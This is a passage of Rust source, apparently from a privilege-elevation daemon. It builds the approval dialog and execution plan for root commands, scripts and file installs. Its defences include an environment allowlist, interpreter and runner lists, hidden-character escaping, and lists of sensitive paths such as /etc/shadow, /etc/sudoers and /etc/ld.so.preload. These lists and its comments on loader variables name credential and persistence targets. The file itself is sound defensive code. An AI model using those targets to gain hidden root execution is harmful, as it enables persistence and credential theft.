//! Turns a client [`Request`] into (a) the exact [`PromptView`] the human
//! sees and (b) the exact [`Execution`] that runs if they approve. Both come
//! from the same resolved values, in one place, so they cannot disagree.

use std::collections::BTreeMap;
use std::os::fd::OwnedFd;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use peekexec_core::display::shell_join;
use peekexec_core::format::{format_shell, verbatim};
use peekexec_core::{Action, Request};
use peekexec_proto::view::{
    Approval, ProcLine, PromptView, Provenance, Section, Shown, Syntax, ViewKind,
};
use peekexec_proto::{Enforced, Level};

use crate::inspect::{Facts, Inspection};
use crate::platform::{ExecPlan, Peer, ProcessInfo, Sandbox};
use crate::session::Display;
use crate::trust::{self, SAFE_PATH};

pub enum Execution {
    Command(ExecPlan),
    /// Nothing runs (agent registration).
    Nothing,
    /// Written by the daemon itself; no program runs.
    Install {
        dest: PathBuf,
        content: Vec<u8>,
    },
}

pub struct Prepared {
    pub view: PromptView,
    pub exec: Execution,
    pub enforced: Enforced,
    /// Root-owned copy of a script, removed after the request ends.
    pub snapshot_dir: Option<PathBuf>,
}

/// Looks at the filesystem for a request with the requesting user's
/// authority (see [`crate::inspect`]).
pub type Inspector = dyn Fn(&Request, &[u32]) -> Result<(Inspection, OwnedFd), String> + Sync;

pub struct Ctx<'a> {
    pub sandbox: &'a dyn Sandbox,
    pub inspect: &'a Inspector,
    pub wants_password: bool,
    pub dev: bool,
    pub snapshot_root: &'a Path,
}

/// Longest dialog timeout a request may ask for.
pub const MAX_TIMEOUT_SECS: u32 = 600;

const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "busybox"];

/// The only variables a request may set. An allowlist, because the list of
/// variables that make *some* program load code from an unshown place
/// (LD_*, PATH, BASH_ENV, PYTHONPATH, GIT_CONFIG_*, PAGER, JAVA_TOOL_OPTIONS,
/// ...) is open-ended.
pub const ENV_ALLOW: &[&str] = &[
    "DEBIAN_FRONTEND",
    "DEBCONF_NONINTERACTIVE_SEEN",
    "APT_LISTCHANGES_FRONTEND",
    "NEEDRESTART_MODE",
    "NEEDRESTART_SUSPEND",
    "LANG",
    "LANGUAGE",
    "TZ",
    "TERM",
    "NO_COLOR",
    "COLUMNS",
    "LINES",
    "LC_ALL",
    "LC_ADDRESS",
    "LC_COLLATE",
    "LC_CTYPE",
    "LC_IDENTIFICATION",
    "LC_MEASUREMENT",
    "LC_MESSAGES",
    "LC_MONETARY",
    "LC_NAME",
    "LC_NUMERIC",
    "LC_PAPER",
    "LC_TELEPHONE",
    "LC_TIME",
];

/// Values are restricted too: no `/`, so none of them can name a file
/// (`TZ=:/home/u/x`, `LANG=/home/u/locale`).
fn env_value_ok(v: &str) -> bool {
    v.len() <= 256
        && v.chars()
            .all(|c| c.is_ascii_alphanumeric() || "_.@:+,-".contains(c))
}

pub fn prepare(
    ctx: &Ctx,
    peer: &Peer,
    user: &User,
    req: &Request,
    id: &str,
    display: &Display,
    materialize: bool,
) -> Result<Prepared, String> {
    validate(req)?;
    let owners = trust::trusted_owners();
    let env = command_env(user, &req.env, ctx.dev);
    let mut snapshot_dir = None;
    let mut notes = Vec::new();
    // Everything known about the filesystem comes from here: nothing below
    // looks at a requester-named path itself.
    let (inspection, cwd_fd) = (ctx.inspect)(req, &owners)?;
    let workdir = WorkDir {
        path: inspection.cwd.clone(),
        fd: Arc::new(cwd_fd),
    };
    notes.extend(inspection.cwd_warning.clone());
    let mismatch = || "internal error: inspection does not match the request".to_string();

    let (sections, exec, enforced) = match (&req.action, inspection.facts) {
        (
            Action::Run { argv },
            Facts::Run {
                program,
                file_args_note,
            },
        ) => {
            let plan = ExecPlan {
                program: program.clone(),
                argv: argv.clone(),
                env,
                cwd: workdir.path.clone(),
                cwd_fd: Some(Arc::clone(&workdir.fd)),
                write: req.write.clone(),
                no_net: req.no_net,
                audit_uid: Some(peer.uid),
            };
            let enforced = ctx.sandbox.enforcement(&plan);
            notes.extend(file_args_note);
            (
                vec![run_section(argv, &program)],
                Execution::Command(plan),
                enforced,
            )
        }
        (
            Action::Script {
                path,
                content,
                args,
            },
            Facts::Script {
                interpreter: interp,
                interpreter_arg: interp_arg,
                file_args_note,
            },
        ) => {
            let name = Path::new(path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("script")
                .to_string();
            let dir = ctx.snapshot_root.join(id);
            // The interpreter receives the snapshot's path as an argument,
            // so none of it may come from the requester.
            let copy = dir.join(snapshot_name(&name));
            if materialize {
                write_snapshot(&dir, &copy, content)?;
                snapshot_dir = Some(dir);
            }
            let copy = path_str(&copy)?;
            let mut argv = vec![interp.clone()];
            argv.extend(interp_arg.clone());
            argv.push(copy.clone());
            let snapshot = argv.len() - 1;
            // `awk -f FILE` and `sed -f FILE` go on reading options (another
            // `-f`, `-e CODE`) from the arguments that follow.
            if interp_arg.as_deref() == Some("-f") {
                argv.push("--".into());
            }
            argv.extend(args.iter().cloned());
            notes.extend(file_args_note);
            let plan = ExecPlan {
                program: interp.clone(),
                argv: argv.clone(),
                env,
                cwd: workdir.path.clone(),
                cwd_fd: Some(Arc::clone(&workdir.fd)),
                write: req.write.clone(),
                no_net: req.no_net,
                audit_uid: Some(peer.uid),
            };
            let text = String::from_utf8_lossy(content).into_owned();
            let is_shell = SHELLS.contains(&basename(&interp));
            // The requester's label comes last: it cannot push the
            // arguments out of view.
            let mut invocation = argv_lines(&argv, snapshot, "(a snapshot of the script below)");
            invocation.push(display_line(
                &format!("the requester calls the script {path}"),
                200,
            ));
            let section = Section {
                title: display_line(&name, 80),
                invocation,
                syntax: if is_shell {
                    Syntax::Shell
                } else {
                    Syntax::Plain
                },
                formatted: verbatim(&text),
                raw: text,
            };
            let enforced = ctx.sandbox.enforcement(&plan);
            (vec![section], Execution::Command(plan), enforced)
        }
        (
            Action::Install { src, content, .. },
            Facts::Install {
                dest,
                existing,
                file_args_note,
            },
        ) => {
            notes.extend(file_args_note);
            let dest_s = dest;
            let dest = PathBuf::from(&dest_s);
            let mut facts = match &existing {
                Some(e) => vec![
                    format!(
                        "replaces an existing file of {} bytes with {} bytes",
                        e.len,
                        content.len()
                    ),
                    format!(
                        "owner stays {}, mode stays {:o} (setuid, setgid and sticky bits are \
                         always cleared)",
                        e.owner, e.mode
                    ),
                ],
                None => vec![format!(
                    "new file: owner root, mode {:o}, {} bytes",
                    crate::exec::new_file_mode(content),
                    content.len()
                )],
            };
            facts.push(format!("the requester calls the new content {src}"));
            // The destination in full on a counted line: the title is cut.
            let facts: Vec<Shown> =
                std::iter::once(display_line(&format!("writes {dest_s}"), usize::MAX))
                    .chain(facts.iter().map(|f| display_line(f, 300)))
                    .collect();
            let mut sections = vec![install_section(&dest_s, facts, content, &mut notes)];
            match existing.map(|e| e.content) {
                Some(Ok(old)) => {
                    if let Some(diff) = install_diff(&old, content) {
                        sections.insert(0, diff);
                    }
                }
                Some(Err(why)) => notes.push(format!(
                    "Replaces {dest_s}, whose current content {why}; it is lost."
                )),
                None => {}
            }
            let enforced = Enforced {
                write: Some(vec![dest_s]),
                write_level: Level::Builtin,
                network: false,
                network_level: Level::Builtin,
            };
            let exec = Execution::Install {
                dest,
                content: content.clone(),
            };
            (sections, exec, enforced)
        }
        _ => return Err(mismatch()),
    };

    notes.extend(sensitive_targets(&sections, &enforced));
    if ctx.dev {
        notes.push(format!(
            "DEVELOPMENT MODE: this runs as {}, not as root.",
            user.name
        ));
    }
    if !display.verified {
        notes.push("Could not verify which display server shows this dialog: a program of yours could be relaying it and reading what you type. Approve only a request you expected.".into());
    }
    if !peer.pinned {
        notes.push("Requester identity could not be pinned (needs Linux 6.5+): the process details below are best effort.".into());
    }
    if std::fs::read_to_string("/proc/sys/kernel/yama/ptrace_scope").is_ok_and(|s| s.trim() == "0")
    {
        notes.push(
            "ptrace_scope is 0: other programs of yours may be able to read this dialog.".into(),
        );
    }
    // Some notes quote requester-chosen paths.
    let notes: Vec<Shown> = notes.iter().map(|n| display_line(n, 1000)).collect();

    let requester = std::iter::once(&peer.process)
        .chain(&peer.ancestry)
        .map(proc_line)
        .collect();
    let view = PromptView {
        kind: ViewKind::Root,
        approval: Approval::Password,
        provenance: Provenance::Unregistered,
        request_id: id.to_string(),
        sha256: req.digest(),
        requester,
        requester_user: display_line(&user.name, 64),
        pinned: peer.pinned,
        cwd: display_line(&workdir.path, 300),
        run_as: if ctx.dev {
            display_line(&format!("{} (development mode, NOT root)", user.name), 120)
        } else {
            Shown::fixed("root")
        },
        dev_mode: ctx.dev,
        why: req.why.as_deref().map(|w| display_line(w, 300)),
        enforced: enforced.clone(),
        display_tier: display.tier,
        display_verified: display.verified,
        env: req
            .env
            .iter()
            .map(|(k, v)| (display_line(k, 64), display_line(v, 256)))
            .collect(),
        sections,
        notes,
        timeout_secs: req.timeout_secs.clamp(5, MAX_TIMEOUT_SECS),
        wants_password: ctx.wants_password,
        input_guard_ms: 400,
        enter_approves: false,
        approve_delay_ms: 0,
    };
    let mut view = view;
    view.enter_approves = plain_run(req, &exec) && view.notes.is_empty() && view.findings() == 0;
    Ok(Prepared {
        view,
        exec,
        enforced,
        snapshot_dir,
    })
}

/// Programs that take code to run, not only arguments: what they do is
/// written in text the human has to read.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "yash", "fish", "csh", "tcsh", "busybox",
    "python", "pypy", "perl", "ruby", "node", "nodejs", "bun", "deno", "php", "lua", "luajit",
    "tclsh", "wish", "expect", "awk", "gawk", "mawk", "nawk", "sed", "R", "Rscript", "julia",
    "guile", "racket", "sbcl", "ocaml", "runghc", "groovy", "jshell",
];

/// Programs that run another program named in their arguments (so the
/// interpreter may be any argument, not the first), or run code found in
/// files they read.
const RUNNERS: &[&str] = &[
    "env",
    "timeout",
    "nice",
    "ionice",
    "chrt",
    "taskset",
    "nohup",
    "setsid",
    "stdbuf",
    "time",
    "xargs",
    "find",
    "parallel",
    "watch",
    "flock",
    "chroot",
    "unshare",
    "nsenter",
    "setpriv",
    "capsh",
    "systemd-run",
    "run-parts",
    "su",
    "runuser",
    "sudo",
    "doas",
    "pkexec",
    "script",
    "strace",
    "ltrace",
    "gdb",
    "valgrind",
    "make",
    "cmake",
    "ninja",
    "at",
    "batch",
    "dbus-launch",
    "dbus-run-session",
    "xvfb-run",
];

/// Whether a word names one of `names`: the name itself, or with a version
/// after it (`python3.12`, `perl5.34-x86_64-linux-gnu`), as a path or not.
fn names_one_of(word: &str, names: &[&str]) -> bool {
    let base = basename(word);
    names.iter().any(|n| {
        base.strip_prefix(n).is_some_and(|rest| {
            rest.is_empty()
                || rest.starts_with(|c: char| c.is_ascii_digit() || c == '.' || c == '-')
        })
    })
}

/// Whether Enter may approve this request at all: only a plain `run`, one
/// program and its arguments, read at a glance. Scripts, installs, code
/// for an interpreter (`sh -c`, `python3 -c`), a program run by another
/// (`timeout 9 sh -c ...`), and any argument that is more than one word or
/// holds shell syntax take a click, whatever the checks found: the checks
/// are a list of known dangers, and the requester can preview against it
/// until nothing is flagged.
fn plain_run(req: &Request, exec: &Execution) -> bool {
    let (Action::Run { argv }, Execution::Command(plan)) = (&req.action, exec) else {
        return false;
    };
    // Every word, and the file argv[0] resolved to (`/usr/bin/python` may
    // be a link to `python3`).
    let runs_code = argv
        .iter()
        .chain([&plan.program])
        .any(|w| names_one_of(w, INTERPRETERS) || names_one_of(w, RUNNERS));
    let plain_word = |a: &String| {
        !a.chars()
            .any(|c| c.is_whitespace() || c.is_control() || "$`;|&<>(){}".contains(c))
    };
    !runs_code && argv.iter().all(plain_word)
}

/// Text for a single dialog line: characters that could fake extra lines or
/// hide text become visible `⟨U+XXXX⟩` tokens, and long text is cut.
pub fn display_line(s: &str, max_chars: usize) -> Shown {
    Shown::line(s, max_chars)
}

/// Control characters as visible `⟨U+XXXX⟩` tokens, everything else as is
/// (the dialog marks other hidden characters itself). The tokens are not
/// ASCII, so they also count as findings and Enter does not approve.
fn escape_controls(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_control() || matches!(c, '\u{2028}' | '\u{2029}') {
                format!("⟨U+{:04X}⟩", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect()
}

/// Prefix of the note added when the display cannot be verified.
pub const UNVERIFIED_NOTE: &str = "Could not verify which display server shows this dialog";
const SYSTEM_PROMPT_NOTE: &str = "You will confirm in your desktop's own password dialog";
const SYSTEM_PROMPT_NOTE_TEXT: &str = "You will confirm in your desktop's own password dialog \
     next; it repeats the key facts. This window cannot be verified: if the two disagree, cancel.";

/// Switch a view to approval through the desktop's own prompt.
pub fn use_system_prompt(view: &mut PromptView) {
    view.approval = Approval::SystemPrompt;
    view.wants_password = false;
    view.notes.retain(|n| !n.starts_with(UNVERIFIED_NOTE));
    view.notes.insert(0, Shown::fixed(SYSTEM_PROMPT_NOTE_TEXT));
}

/// Lines the desktop's prompt shows per part of a section (the invocation,
/// the content), and characters per line: longer lines wrap, they are
/// never cut. The prompt does not scroll, so this is all it can hold.
pub const PROMPT_LINES: usize = 12;
const PROMPT_WIDTH: usize = 120;

/// The text the desktop's prompt shows: the decisive facts on their own,
/// since a decoy window could sit next to it. On that path it is the only
/// view the human can trust, so it must hold everything root runs (R4):
/// `Err` says how many lines would not fit, and the request is refused
/// rather than approved with parts of it shown only in the window that
/// cannot be verified.
pub fn system_prompt_message(view: &PromptView) -> Result<String, usize> {
    let mut omitted = 0;
    let mut add = |lines: Vec<String>, indent: &str, body: &mut String| {
        omitted += lines.len().saturating_sub(PROMPT_LINES);
        for l in lines {
            body.push_str(&format!("{indent}{l}\n"));
        }
    };
    let mut body = String::new();
    for s in &view.sections {
        body.push_str(&format!("\n{}:\n", ascii(&cut(&s.title, 80))));
        // How it runs (each argument), then what it runs: both counted.
        let invocation = s
            .invocation
            .iter()
            .flat_map(|l| wrap(&ascii(l), PROMPT_WIDTH))
            .collect();
        add(invocation, "  ", &mut body);
        let lines = s
            .formatted
            .iter()
            .filter_map(prompt_line)
            .flat_map(|l| wrap(&l, PROMPT_WIDTH))
            .collect();
        add(lines, "    ", &mut body);
    }
    if omitted > 0 {
        return Err(omitted);
    }
    let mut m = String::new();
    m.push_str(match view.kind {
        ViewKind::Root => "peekexec: run this as root?\n",
        ViewKind::Register => "peekexec: register an agent session?\n",
    });
    let findings = view.findings();
    if findings > 0 {
        m.push_str(&format!(
            "⚠ {findings} suspicious character(s): every character outside plain ASCII is \
             shown below as ⟨U+XXXX⟩.\n"
        ));
    }
    // The daemon's facts and warnings come before anything the requester
    // sent, so nothing it sends can push them out of view.
    if view.kind == ViewKind::Root {
        let facts: Vec<String> = view
            .summary(0)
            .into_iter()
            .map(|(_, t)| ascii(&cut(&t, 160)))
            .collect();
        m.push_str(&format!("{}\n", facts.join(" · ")));
    }
    // Every value below is a `Shown`, already escaped where the view was
    // built: only cut here (escaping again would mangle its tokens).
    let from = match &view.provenance {
        Provenance::InSession { agent, since, .. } => {
            format!("{}'s session (registered {since})", ascii(&cut(agent, 60)))
        }
        Provenance::Unregistered => view
            .requester
            .first()
            .map(|p| {
                format!(
                    "{} (pid {}), not a registered agent",
                    ascii(&cut(&p.name(), 40)),
                    p.pid
                )
            })
            .unwrap_or_default(),
    };
    m.push_str(&format!(
        "from: {from}\nin: {}\n",
        ascii(&cut(&view.cwd, 120))
    ));
    if let Provenance::InSession { others, .. } = &view.provenance {
        if !others.is_empty() {
            let others: Vec<String> = others.iter().map(|o| ascii(&cut(o, 40))).collect();
            m.push_str(&format!(
                "⚠ a script or program it started may be asking: {}\n",
                others.join(", ")
            ));
        }
    }
    let warnings = view
        .notes
        .iter()
        .filter(|n| !n.starts_with(SYSTEM_PROMPT_NOTE));
    // All of them: each kind of note appears at most once.
    for n in warnings {
        m.push_str(&format!("⚠ {}\n", ascii(&cut(n, 300))));
    }
    m.push_str(&body);
    // Every variable, after the command: the allowlist bounds how many
    // there can be.
    if !view.env.is_empty() {
        m.push('\n');
    }
    for (k, v) in &view.env {
        m.push_str(&format!(
            "env: {}={}\n",
            ascii(&cut(k, 64)),
            ascii(&cut(v, 256))
        ));
    }
    m.push_str(&format!(
        "request sha256 {}…",
        &view.sha256[..12.min(view.sha256.len())]
    ));
    Ok(m)
}

/// Why a request is refused when [`system_prompt_message`] cannot hold it.
pub fn too_long_for_system_prompt(omitted: usize) -> String {
    format!(
        "refused: the desktop's password dialog is the only view of this request that can be \
         trusted here, and it holds {PROMPT_LINES} lines per part; {omitted} lines of this \
         request would not be in it. Split it into smaller steps (several short scripts, or \
         `peekexec install` for each file)"
    )
}

/// One content line for the prompt, or `None` for a line with nothing but
/// spaces and tabs. Indentation as [`Line::shown`] gives it, the text's own
/// as a count (the prompt draws no indentation of its own).
///
/// [`Line::shown`]: peekexec_core::format::Line::shown
fn prompt_line(l: &peekexec_core::format::Line) -> Option<String> {
    let (_, text) = l.shown();
    if text.chars().all(|c| c == ' ' || c == '\t') {
        return None;
    }
    Some(ascii(&display_line(text, usize::MAX)))
}

/// At most `max` characters of already-escaped text.
fn cut(s: &str, max: usize) -> String {
    let mut out: String = s.chars().take(max).collect();
    if s.chars().nth(max).is_some() {
        out.push('…');
    }
    out
}

/// Text for the desktop's prompt, which has no colour or markers of its
/// own: every character outside printable ASCII becomes `⟨U+XXXX⟩` (a
/// Cyrillic letter in a host name, a tag character, Hebrew that reorders
/// the line), except the tokens `Shown` already made; runs of more than
/// three spaces become `⟨N spaces⟩`, so padding cannot push code out of
/// the lines shown.
fn ascii(s: &str) -> String {
    let mut out = String::new();
    let mut spaces = 0;
    let flush = |out: &mut String, spaces: &mut usize| {
        if *spaces > 3 {
            out.push_str(&format!("⟨{spaces} spaces⟩"));
        } else {
            out.push_str(&" ".repeat(*spaces));
        }
        *spaces = 0;
    };
    for c in s.chars() {
        if c == ' ' {
            spaces += 1;
            continue;
        }
        flush(&mut out, &mut spaces);
        if c.is_ascii_graphic() || matches!(c, '⟨' | '⟩') {
            out.push(c);
        } else {
            out.push_str(&format!("⟨U+{:04X}⟩", c as u32));
        }
    }
    flush(&mut out, &mut spaces);
    out
}

/// `s` in pieces of at most `width` characters.
fn wrap(s: &str, width: usize) -> Vec<String> {
    let chars: Vec<char> = s.chars().collect();
    chars
        .chunks(width.max(1))
        .map(|c| c.iter().collect())
        .collect()
}

pub struct User {
    pub name: String,
    pub home: String,
    pub uid: u32,
    /// Primary group, from the user database.
    pub gid: u32,
    /// Primary and supplementary groups, from the user database.
    pub groups: Vec<u32>,
}

fn validate(req: &Request) -> Result<(), String> {
    if !req.cwd.starts_with('/') {
        return Err("cwd must be absolute".into());
    }
    if let Action::Run { argv } = &req.action {
        if argv.is_empty() || argv[0].is_empty() {
            return Err("empty command".into());
        }
    }
    let strings: Vec<&str> = match &req.action {
        Action::Run { argv } => argv.iter().map(String::as_str).collect(),
        Action::Script { path, args, .. } => std::iter::once(path.as_str())
            .chain(args.iter().map(String::as_str))
            .collect(),
        Action::Install { src, dest, .. } => vec![src, dest],
    };
    if strings.iter().any(|s| s.contains('\0')) {
        return Err("arguments may not contain NUL bytes".into());
    }
    // Paths root writes to are shown in the one-line summary: a line break
    // would fake its lines, a bidi or invisible character would hide part
    // of it, a look-alike would pass for another name. An allowlist:
    // printable ASCII and spaces.
    let plain = |s: &str| s.chars().all(|c| c.is_ascii_graphic() || c == ' ');
    if let Action::Install { src, dest, content } = &req.action {
        // An installed file may be run later, perhaps by Python. Any coding
        // cookie must be UTF-8; a zip archive is refused in what looks like
        // Python (elsewhere one makes the file binary: described, not shown).
        let first = content.split(|&b| b == b'\n').next().unwrap_or_default();
        let python = [src, dest]
            .iter()
            .any(|p| [".py", ".pyw", ".pyz"].iter().any(|e| p.ends_with(e)))
            || (first.starts_with(b"#!")
                && (first.windows(6).any(|w| w == b"python")
                    || first.windows(4).any(|w| w == b"pypy")));
        crate::inspect::read_as_shown(content, python)?;
        // Into a directory, the file is named after `src`.
        let name = Path::new(src).file_name().and_then(|n| n.to_str());
        if let Some(bad) = [Some(dest.as_str()), name]
            .into_iter()
            .flatten()
            .find(|s| !plain(s))
        {
            return Err(format!(
                "install destination may not contain control characters or hidden \
                 characters (only printable ASCII): {}",
                display_line(bad, 300)
            ));
        }
    }
    for path in req.write.iter().flatten() {
        if !path.starts_with('/') {
            return Err(format!("--write path must be absolute: {path}"));
        }
        if !plain(path) {
            return Err(format!(
                "--write path may not contain control characters or hidden characters \
                 (only printable ASCII): {}",
                display_line(path, 300)
            ));
        }
    }
    for (k, v) in &req.env {
        // Exact names: a name is requester text too, and a prefix rule let
        // line breaks and `=` through (design rule 3).
        if !ENV_ALLOW.contains(&k.as_str()) {
            return Err(format!(
                "--env {} is not allowed. Allowed: {}. Other variables can make root load \
                 code that the dialog cannot show",
                display_line(k, 64),
                ENV_ALLOW.join(", ")
            ));
        }
        if !env_value_ok(v) {
            return Err(format!(
                "--env {k}: value may only contain letters, digits and _.@:+,- (no paths)"
            ));
        }
    }
    Ok(())
}

fn command_env(
    user: &User,
    extra: &BTreeMap<String, String>,
    dev: bool,
) -> BTreeMap<String, String> {
    let (name, home) = if dev {
        (user.name.as_str(), user.home.as_str())
    } else {
        ("root", "/root")
    };
    let mut env: BTreeMap<String, String> = [
        ("PATH", SAFE_PATH),
        ("HOME", home),
        ("USER", name),
        ("LOGNAME", name),
        ("SHELL", "/bin/sh"),
        ("LANG", "C.UTF-8"),
    ]
    .into_iter()
    .map(|(k, v)| (k.to_string(), v.to_string()))
    .collect();
    env.extend(extra.iter().map(|(k, v)| (k.clone(), v.clone())));
    env
}

fn basename(p: &str) -> &str {
    p.rsplit('/').next().unwrap_or(p)
}

fn path_str(p: &Path) -> Result<String, String> {
    p.to_str()
        .map(str::to_string)
        .ok_or_else(|| format!("path is not valid UTF-8: {}", p.display()))
}

fn run_section(argv: &[String], program: &str) -> Section {
    // One argument per line: line breaks and other control characters
    // inside an argument become visible tokens, or one argument could pass
    // for several.
    let raw: String = argv
        .iter()
        .enumerate()
        .map(|(i, a)| format!("argv[{i}] {}\n", escape_controls(a)))
        .collect();
    let resolved = if basename(program) == basename(&argv[0]) && argv[0].starts_with('/') {
        None
    } else {
        Some(display_line(
            &format!("the program is {program} (argv[0] {})", argv[0]),
            usize::MAX,
        ))
    };
    let is_shell = SHELLS.contains(&basename(&argv[0])) || SHELLS.contains(&basename(program));
    if is_shell && argv.len() >= 3 && argv[1] == "-c" {
        // The arguments after the script ($0, $1, ...) are executed data
        // too: one line each, in full, never in a header that is cut.
        let mut invocation = argv_lines(argv, 2, "(the script below)");
        invocation.extend(resolved);
        return Section {
            title: Shown::fixed("shell script"),
            invocation,
            syntax: Syntax::Shell,
            raw: argv[2].clone(),
            formatted: format_shell(&argv[2]),
        };
    }
    Section {
        title: Shown::fixed("command"),
        invocation: resolved.into_iter().collect(),
        syntax: Syntax::Shell,
        raw,
        formatted: verbatim(&shell_join(argv)),
    }
}

/// `argv[i] VALUE`, one line per argument, escaped and never cut; the
/// argument at `content` is the section's content and is named instead.
/// The fixed words are ASCII, so only requester text counts as findings.
fn argv_lines(argv: &[String], content: usize, name: &str) -> Vec<Shown> {
    argv.iter()
        .enumerate()
        .map(|(i, a)| {
            let value = if i == content { name } else { a.as_str() };
            display_line(&format!("argv[{i}] {value}"), usize::MAX)
        })
        .collect()
}

/// The snapshot's file name: fixed, keeping a short alphanumeric extension
/// (`deploy.py` → `script.py`) for interpreters that care.
fn snapshot_name(requested: &str) -> String {
    match Path::new(requested).extension().and_then(|e| e.to_str()) {
        Some(ext)
            if (1..=8).contains(&ext.len()) && ext.bytes().all(|b| b.is_ascii_alphanumeric()) =>
        {
            format!("script.{ext}")
        }
        _ => "script".into(),
    }
}

/// The working directory as inspected, and its descriptor.
struct WorkDir {
    path: String,
    fd: Arc<OwnedFd>,
}

/// Places where a file makes root run commands later, or controls logins.
const SENSITIVE: &[&str] = &[
    "/etc/sudoers",
    "/etc/sudo.conf",
    "/etc/cron",
    "/etc/anacrontab",
    "/etc/init.d",
    "/etc/rc.local",
    "/etc/modprobe.d",
    "/etc/modules-load.d",
    "/etc/logrotate",
    "/etc/xdg/autostart",
    "/etc/X11/Xsession",
    "/etc/update-motd.d",
    "/etc/NetworkManager/dispatcher.d",
    "/etc/kernel",
    "/etc/default/grub",
    "/boot",
    "/usr/share/polkit-1",
    // Before /usr/bin in root's PATH: a program here shadows the system one.
    "/usr/local/bin",
    "/usr/local/sbin",
    "/var/spool/cron",
    "/etc/systemd",
    "/lib/systemd",
    "/usr/lib/systemd",
    "/etc/udev",
    "/lib/udev",
    "/etc/profile",
    "/etc/bash.bashrc",
    "/etc/environment",
    "/etc/ld.so.preload",
    "/etc/ld.so.conf",
    "/etc/pam.d",
    "/etc/security",
    "/etc/ssh",
    "/root/.ssh",
    "/etc/polkit-1",
    "/etc/apt/sources.list",
    "/etc/apt/apt.conf",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/sysctl",
    "/usr/lib/sysctl.d",
    "/etc/tmpfiles.d",
    "/usr/lib/tmpfiles.d",
    "/etc/dpkg/dpkg.cfg",
    "/etc/dbus-1",
    "/usr/share/dbus-1/system",
    "/root/.bashrc",
    "/root/.profile",
];

/// Directories whose files root runs or loads: flagged when they are
/// written to (`--write`, an install), not wherever the text names them,
/// since nearly every script mentions /usr/bin.
const SENSITIVE_WRITES: &[&str] = &[
    "/usr/bin",
    "/usr/sbin",
    "/bin",
    "/sbin",
    "/lib",
    "/usr/lib",
    "/usr/libexec",
    "/usr/local/lib",
    "/root",
    "/etc/default",
];

/// One note for all hits, so naming many paths cannot push other warnings
/// out of the desktop prompt's summary.
fn sensitive_targets(sections: &[Section], enforced: &Enforced) -> Option<String> {
    let mut hits: Vec<&str> = Vec::new();
    let texts = sections
        .iter()
        .map(|s| s.raw.as_str())
        .chain(enforced.write.iter().flatten().map(String::as_str));
    for text in texts {
        // `/etc//cron.d`, `/etc/./cron.d` and `/etc/x/../cron.d` name
        // /etc/cron.d too.
        // As written, and with `..` applied both ways it can mean.
        let forms = [
            text.to_string(),
            normalize_paths(text, false),
            normalize_paths(text, true),
        ];
        for &p in SENSITIVE {
            if forms.iter().any(|t| t.contains(p)) && !hits.contains(&p) {
                hits.push(p);
            }
        }
    }
    for w in enforced.write.iter().flatten() {
        let forms = [
            w.clone(),
            normalize_paths(w, false),
            normalize_paths(w, true),
        ];
        for &p in SENSITIVE_WRITES {
            let under = forms
                .iter()
                .any(|w| w == p || w.starts_with(&format!("{p}/")));
            if under && !hits.contains(&p) {
                hits.push(p);
            }
        }
    }
    (!hits.is_empty()).then(|| {
        let paths: Vec<String> = hits.iter().map(|p| format!("{p}*")).collect();
        format!(
            "Touches {}: files there can run commands as root later or control logins.",
            paths.join(", ")
        )
    })
}

/// `text` with every absolute path in it normalized lexically: no empty
/// or `.` components, and `..` applied. With `merged_usr`, `/bin`, `/sbin`
/// and `/lib*` are the symlinks into /usr they are on most systems now,
/// so `/bin/..` is `/usr`.
fn normalize_paths(text: &str, merged_usr: bool) -> String {
    let boundary = |c: char| c.is_whitespace() || "'\"`;|&<>(),=".contains(c);
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(i) = rest.find('/') {
        let at_start = rest[..i].chars().next_back().map_or(true, boundary);
        out.push_str(&rest[..i]);
        rest = &rest[i..];
        let end = rest.find(boundary).unwrap_or(rest.len());
        let (path, tail) = rest.split_at(end);
        if at_start {
            let mut parts: Vec<&str> = Vec::new();
            for c in path.split('/') {
                match c {
                    "" | "." => {}
                    ".." => {
                        let top = matches!(
                            parts.as_slice(),
                            ["bin" | "sbin" | "lib" | "lib32" | "lib64" | "libx32"]
                        );
                        parts.pop();
                        if merged_usr && top {
                            parts.push("usr");
                        }
                    }
                    c => parts.push(c),
                }
            }
            out.push('/');
            out.push_str(&parts.join("/"));
            if path.ends_with('/') && !parts.is_empty() {
                out.push('/');
            }
        } else {
            out.push_str(path);
        }
        rest = tail;
    }
    out.push_str(rest);
    out
}

fn install_section(
    dest: &str,
    invocation: Vec<Shown>,
    content: &[u8],
    notes: &mut Vec<String>,
) -> Section {
    let binary = content.contains(&0) || std::str::from_utf8(content).is_err();
    let (raw, syntax) = if binary {
        let kind = if content.starts_with(b"\x7fELF") {
            notes.push(format!("Installs an executable program into {dest}."));
            "an executable program (ELF)"
        } else {
            "binary data"
        };
        (
            format!(
                "Not text: {kind}, {} bytes, sha256 {}.\nIts content cannot be shown here.\n",
                content.len(),
                peekexec_core::request::sha256_hex(content)
            ),
            Syntax::Plain,
        )
    } else {
        (String::from_utf8_lossy(content).into_owned(), Syntax::Plain)
    };
    Section {
        title: display_line(&format!("new {dest}"), 120),
        invocation,
        syntax,
        formatted: verbatim(&raw),
        raw,
    }
}

/// What changes in an existing text file, as a unified diff.
fn install_diff(old: &[u8], content: &[u8]) -> Option<Section> {
    let (old, new) = (
        std::str::from_utf8(old).ok()?,
        std::str::from_utf8(content).ok()?,
    );
    let diff = similar::TextDiff::from_lines(old, new)
        .unified_diff()
        .context_radius(3)
        .header("current", "new")
        .to_string();
    let raw = if diff.is_empty() {
        "No changes: the new content is identical to the current file.\n".to_string()
    } else {
        diff
    };
    Some(Section {
        title: Shown::fixed("changes"),
        invocation: vec![Shown::fixed(
            "unified diff: lines starting with - are removed, + are added",
        )],
        syntax: Syntax::Diff,
        formatted: verbatim(&raw),
        raw,
    })
}

fn write_snapshot(dir: &Path, file: &Path, content: &[u8]) -> Result<(), String> {
    use std::os::unix::fs::{DirBuilderExt, OpenOptionsExt};
    let err = |e: std::io::Error| format!("snapshot {}: {e}", file.display());
    if let Some(root) = dir.parent() {
        std::fs::DirBuilder::new()
            .recursive(true)
            .mode(0o700)
            .create(root)
            .map_err(err)?;
    }
